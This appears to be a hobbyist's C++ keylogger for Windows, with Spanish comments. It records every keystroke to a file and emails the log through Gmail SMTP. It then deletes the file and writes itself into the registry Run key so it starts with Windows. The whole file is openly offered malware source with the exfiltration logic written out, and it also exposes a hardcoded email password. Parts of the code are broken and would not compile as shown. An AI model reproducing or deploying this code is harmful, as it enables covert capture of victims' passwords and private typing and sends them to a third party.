// KeyLo.cpp : Defines the entry point for the console application.
//
/*
1.- De la pagina https://www.emailarchitect.net/easendmail/kb/vc.aspx?cat=0 descarge easendmail.exe 3.509 KB y  lo instale
2.- Cree el proyecto en visual New->Proyect->Aplicacion Visual C++ Win32 console project at first
3.- De las pocibles ubicaciones de instalacion C:\Program Files\EASendMail\Samples_VC\simple.vcNative or
C:\Program Files (x86)\EASendMail\Samples_VC\simple.vcNative extraje los archivos  easendmailobj.tlh and easendmailobj.tli
4.- Esos archivos los copie y los puse en Carpeta de proyecto->proyecto->donde esta mi codigo fuente y los archivos stdafx.h and targetver.h

******************************CASOS PARTICULARES******************************************
* Para usar fopen agregamos en 															 *
* Proyecto,propiedades,configuracionpropiedades,cc++,prosesados,definicion de procesador *
*  _CRT_SECURE_NO_DEPRECATE																 *
*																						 *
*																						 *
*																						 *
*																						 *
*																						 *
*	   ************************************************************************			 *
*	   *  J. E. G. M. 03/04/2018 programa KeyLogger en visual estudio 2010 C++*			 *
*      ************************************************************************		     *     													*			 *
******************************************************************************************

5.- Empese a hacer el codigo
*/

//LIBRERIAS A USAR 
#include "stdafx.h"
#include<iostream>
#include<stdlib.h>
#include<string>
#include<ctime>
#include<map> //Array asociativo
#include<windows.h>
#include "easendmailobj.tlh"

//CONSTANTES
#define _WIN32_WINNT 0x0500  //getConsoleWindow()
#define caducidadDia 20;
#define caducidadMes 5;
#define caducidadAno 2018;

using namespace EASendMailObjLib;
using namespace std;

//FUNCIONES
bool caducidad();  //Funcion que checa la fecha para ver si es pocible su ejecucion
void KlogerTextoSalida();
int _tmain(); //Funcion que manda el email, le quite esto int argc, _TCHAR* argv[]
void eliminarAC(string rutaElimar); //Funcion que elimina lo generado por KlogerTextoSalida();
void deInicio(); //Funcion que hace qe el programa se ejecute de inicio

int main()
{
	cout << "Chequeo de fecha" << endl;
	if (caducidad() == true) { exit(EXIT_SUCCESS); } //validando fecha para poder ejecutar
	else { cout << "Paso Fecha" << endl; }
	cout << "\n\t\n\t==================RAMPAPAPAM===============" << endl;
	do //KlogerTextoSalida, mandaremail y eliminarAC
	{
		int wisin = 0;
		cout << "\n\tEmpesamos el DoWhile " << wisin << ":" << endl;
		switch (wisin)
		{
		case 0:
			cout << "\n\t==============Este es el caso CERO==============" << endl;
			KlogerTextoSalida(); //keyLog Texto Salto a case 2 Quite "int argc, char *argv[]" de los parametros de la funcion
			cout << "\n\tAqui termina caso cero " << endl;
			//break;
		case 1:
			cout << "\n\t==============Pasando a case UNO==============" << endl;
			cout << "\n\tMandando email" << endl;
			_tmain();  //mandar email Salto a cas 3 y le quite int argc, _TCHAR* argv[]
			cout << "\n\tYa se mando mail..!" << endl;
			cout << "\n\tAqui termina case uno " << endl;
			//break;
		case 2:
			cout << "\n\t==============Pasando a case DOS==============" << endl;
			string ruta = "log.txt";
			eliminarAC(ruta); //borrado de los pocibles documentos aqui ruta donde esta el archivo a eliminar
			cout << "\n\tAqui termina case dos" << endl;
			//break;
		case 3:
			cout << "\n\t==============Pasando a case TRES==============" << endl;
			deInicio(); //Asiendo que el programa se ejecute de inicio
			cout << "\n\tAqui termina case tres" << endl;
			//break;
			//default:
			//break;
		}
	} while (true);
	system("PAUSE");
	return 0;
}

bool caducidad()
{
	int dia, mes, ano;
	time_t now = time(0); //fecha y ora basada en el sistema
						  // Objeto de una estruc tm con fecha y hora local
	tm * time = localtime(&now);
	cout << time->tm_mday << "-" << time->tm_mon + 1 << "-" << time->tm_year + 1900 << endl;
	dia = time->tm_mday;
	mes = time->tm_mon + 1;
	ano = time->tm_year + 1900;
	if (dia < caducidadDia && mes < caducidadMes && ano == caducidadAno) { return true; }
	else { return false; }
}

void KlogerTextoSalida()
{
	int salida = 1;
	/*
	Array asociativo. la clave es el nï¿½mero decimal y el valor el carï¿½cter que representa.
	Estï¿½ adaptado para un teclado en espaï¿½ol. Ya que como viene configurado por defecto
	el nï¿½mero decimal dado no se corresponde a algunas de las teclas de un teclado en espaï¿½ol.
	*/
	map<int, string> ch;
	ch[1] = " [mouse click] ";
	ch[2] = " [mouse menu context] ";
	ch[8] = " [Backspace] ";
	ch[9] = " [Tab] ";
	ch[13] = " [Intro] ";
	ch[16] = " [Shift] ";
	ch[17] = " [Control] ";
	ch[18] = " [Alt] ";
	ch[20] = " [Bloq Mayï¿½s] ";
	ch[27] = " [Esc] ";
	ch[32] = " ";
	ch[37] = " [Flecha izquierda] ";
	ch[38] = " [Flecha arriba] ";
	ch[39] = " [Flecha derecha] ";
	ch[40] = " [Flecha abajo] ";
	ch[44] = " [Impr Pant] ";
	ch[45] = " [Insert] ";
	ch[46] = " [Supr] ";
	ch[48] = "0";
	ch[49] = "1";
	ch[50] = "2";
	ch[51] = "3";
	ch[52] = "4";
	ch[53] = "5";
	ch[54] = "6";
	ch[55] = "7";
	ch[56] = "8";
	ch[57] = "9";
	ch[65] = "a";
	ch[66] = "b";
	ch[67] = "c";
	ch[68] = "d";
	ch[69] = "e";
	ch[70] = "f";
	ch[71] = "g";
	ch[72] = "h";
	ch[73] = "i";
	ch[74] = "j";
	ch[75] = "k";
	ch[76] = "l";
	ch[77] = "m";
	ch[78] = "n";
	ch[79] = "o";
	ch[80] = "p";
	ch[81] = "q";
	ch[82] = "r";
	ch[83] = "s";
	ch[84] = "t";
	ch[85] = "u";
	ch[86] = "v";
	ch[87] = "w";
	ch[88] = "x";
	ch[89] = "y";
	ch[90] = "z";
	ch[91] = " [Menu Windows] ";
	ch[96] = "0";
	ch[97] = "1";
	ch[98] = "2";
	ch[99] = "3";
	ch[100] = "4";
	ch[101] = "5";
	ch[102] = "6";
	ch[103] = "7";
	ch[104] = "8";
	ch[105] = "9";
	ch[106] = "*";
	ch[107] = "+";
	ch[109] = "-";
	ch[110] = ".";
	ch[111] = "/";
	ch[112] = " [F1] ";
	ch[113] = " [F2] ";
	ch[114] = " [F3] ";
	ch[115] = " [F4] ";
	ch[116] = " [F5] ";
	ch[117] = " [F6] ";
	ch[118] = " [F7] ";
	ch[119] = " [F8] ";
	ch[120] = " [F9] ";
	ch[121] = " [F10] ";
	ch[122] = " [F11] ";
	ch[123] = " [F12] ";
	ch[144] = " [ Bloq Num ] ";
	ch[145] = " [Bloq Despl] ";
	ch[186] = "`";
	ch[187] = "+";
	ch[188] = ",";
	ch[189] = "-";
	ch[190] = ".";
	ch[191] = "ï¿½";
	ch[192] = "ï¿½";
	ch[219] = "'";
	ch[220] = "ï¿½";
	ch[221] = "ï¿½";
	ch[222] = "ï¿½";
	ch[226] = "<";
	/* Manejador para un fichero donde se irï¿½n guardando las pulsaciones */
	FILE * log;
	/* Variable para crear un salto de lï¿½nea cada 50 caracteres */
	int count = 1;
	/* Ocultar la consola */
	HWND hWnd = GetConsoleWindow();
	/* 0 = oculta ; 1 = visible */
	ShowWindow(hWnd, 1);
	/* Bï¿½cle infinito para detectar las pulsaciones de tecla */
	while (true)
	{
		/* Recorrer el nï¿½mero de carï¿½cteres de la tabla ASCII que son 255 */
		for (int c = 0; c < 256; c++)
		{
			/* Si una tecla es pulsada */
			if (GetAsyncKeyState(c) == -32767)
			{
				/* Abrir el fichero */
				log = fopen("log.txt", "a");
				/* Si count es igual a N incluir un salto de lï¿½nea en el fichero */
				if (count == 15) { fputs("\n", log); count = 1; salida++; }
				/* Escribir en el fichero el carï¿½cter de la tecla pulsada */
				fputs(ch[c].c_str(), log);
				/* Cerrar el fichero */
				fclose(log);
				/* Aumentar en uno el valor de count */
				count++;
				if (salida == 4) { break; }
			}
			if (salida == 4) { break; }
		}
		if (salida == 4) { break; }
	}
}

int _tmain()
{
	::CoInitialize(NULL);
	IMailPtr oSmtp = NULL;
	oSmtp.CreateInstance("EASendMailObj.Mail");
	oSmtp->LicenseCode = _T("TryIt");

	// Set your gmail email address
	oSmtp->FromAddr = _T("conjguerrero@gmail.com");

	// Add recipient email address
	oSmtp->AddRecipientEx(_T("guerreromje@gmail.com"), 0);

	// Set email subject
	oSmtp->Subject = _T("Hola saludos");

	// Set email body
	oSmtp->BodyText = _T("xxxxxx");

	//Aqui pongo la respuesta del email que me mando el buenas de sistemas de la paguina oficial @Ivan
	if (oSmtp->AddAttachment(_T("log.txt")) != 0)
	{
		_tprintf(_T("Failed to add attachment with error: %s\r\n"),
			(const TCHAR*)oSmtp->GetLastErrDescription());
	}

	// Gmail SMTP server address
	oSmtp->ServerAddr = _T("smtp.gmail.com");

	// Use SSL 465 port,
	oSmtp->ServerPort = 465;

	// detect SSL/TLS automatically
	oSmtp->SSL_init();

	// Gmail user authentication should use your
	// Gmail email address as the user name.
	// For example: your email is "gmailid@gmail.com", then the user should be "gmailid@gmail.com"
	oSmtp->UserName = _T("conjguerrero@gmail.com");
	oSmtp->Password = _T("Ereslomasbonit0");

	_tprintf(_T("Empezando a mandar\r\n"));

	if (oSmtp->SendMail() == 0)
	{
		_tprintf(_T("email was sent successfully!\r\n"));
	}
	else
	{
		_tprintf(_T("failed to send email with the following error: %s\r\n"),
			(const TCHAR*)oSmtp->GetLastErrDescription());
	}
	if (oSmtp != NULL)
		oSmtp.Release();
	return 0;
}

void eliminarAC(string rutaElimar)
{
	string comando;
	comando = "del " + rutaElimar;
	system(comando.c_str());
}

void deInicio()
{
	HKEY * key;
	LPCTSTR ruta = TEXT(" SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
	long status = RegOpenKey(HKEY_LOCAL_MACHINE, ruta, key);
	if (status != 0)
	{
		cout << ruta << endl;
		cout << key << endl;
		cout << status << endl;
		cout << "NO se puede abrir la clabe " << endl;
	}else
	{
		string subclave = "deInicio", valor = "Keyprint";
		LPCTSTR _valor = TEXT(valor.c_str());
		long crear = RegSetValueEx(*key, _subclave, 0, REG_SZ, (LPBYTE)_valor, strlen(_valor) * sizeof(char));
		if (crear != 0) { cout << "Ocurrido un error al crear la subclave" << endl; }
		else { cout << "la clave se reo con exito" << endl; }
		RegCloseKey(*key);
	}
}